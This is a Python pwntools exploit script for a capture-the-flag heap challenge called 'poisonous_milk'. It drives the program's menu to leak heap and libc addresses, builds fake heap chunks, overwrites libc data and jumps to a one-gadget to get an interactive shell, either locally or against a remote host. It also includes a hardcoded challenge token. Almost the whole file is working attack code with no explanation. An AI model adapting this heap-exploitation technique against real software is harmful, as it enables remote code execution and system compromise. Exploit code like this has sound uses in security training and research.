#!/usr/bin/env python

from pwn import *
import sys

def put_milk(inBuf, color):
	r.sendline('p')
	r.recvuntil(': ')
	r.send(inBuf)
	r.recvuntil(': ')
	r.send(color)
	r.recvuntil('> ', timeout=1)

def view():
	r.sendline('v')
	return r.recvuntil('> ', drop=True)

def remove(idx):
	r.sendline('r')
	r.recvuntil(' : ')
	r.sendline(str(idx))
	r.recvuntil('> ')

def drink():
	r.sendline('d')
	r.recvuntil('> ')

def exploit(r):
	if len(sys.argv) > 1:
		r.recvuntil("Token:")
		r.sendline('yuRRme9y3wc5ZCHyhckEBnRsR3ueR8M8')

	put_milk("A"*15 + '\n', '\n')
	remove(0)
	put_milk('B'*85, '\n')

	leak = u64(view().split('[')[2].split(']')[0].ljust(8, '\0')) - 0xc88
	log.info("Heap: " + hex(leak))
	if leak < 0x560000000000:
		log.failure("Error: HEAP needs to start with 0x56 addr.")
		sys.exit(-1)

	remove(0)

	payload  = p64(leak+0xd10)*2
	payload += p64(0)
	payload += p64(0x51)
	payload += p64(leak+0xcc0)
	payload += p64(0)
	payload += "A" * 0x18
	payload += '\n'
	put_milk(payload, '\n')

	payload = p64(0xd1) * 2
	payload += p64(0x424242) * 5
	payload += p64(leak+0xca0)*2
	payload += 'B' * 2
	payload += '\n'
	put_milk(payload, '\n')

	payload  = 'C' * 0x50
	payload += '\n'
	put_milk(payload, '\n')

	drink()

	payload  = p64(leak+0xd38)
	payload += p64(leak+0xd48)
	payload += '\n'
	put_milk(payload, '\n')

	remove(0)

	libc = u64(view().split('\n')[0].split()[-1].ljust(8, '\0')) - 0x3c3b78
	log.info("libc: " + hex(libc))

	payload  = p64(0x444444444444) * 2
	payload += p64(0x41)*2
	payload += p64(0x444444444444)
	payload += p64(leak+0xc80)
	payload += p64(leak+0xcc0)
	payload += '\n'
	put_milk(payload, '\n')

	remove(1)

	payload  = p64(0x61616161) * 2
	payload += p64(0)
	payload += p64(0x51)
	payload += p64(libc+0x3c3b45)*6
	payload += '\n'
	put_milk(payload, '\n')

	payload = p64(0x61) * 2
	payload += p64(0x404040)
	payload += p64(0x393939)
	payload += p64(0x41414141)*4
	put_milk(payload+'\n', '\n')

	remove(0)

	payload = '\x00' * 3
	payload += p64(0) * 4
	payload += p64(libc+0x3c3ae8)
	payload += p64(0)
	payload += p64(libc+0x3c3b78)
	payload += p64(libc+0x3c3b78)
	put_milk(payload+'\n', '\n')

	payload  = p64(0x41414141)*3
	payload += p64(libc + 0xf0567) * 4
	payload += '\n'
	put_milk(payload, '\n')

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./poisonous_milk'], env={"LD_PRELOAD":"./libc-2.23.so"})
        print util.proc.pidof(r)
        pause()
        exploit(r)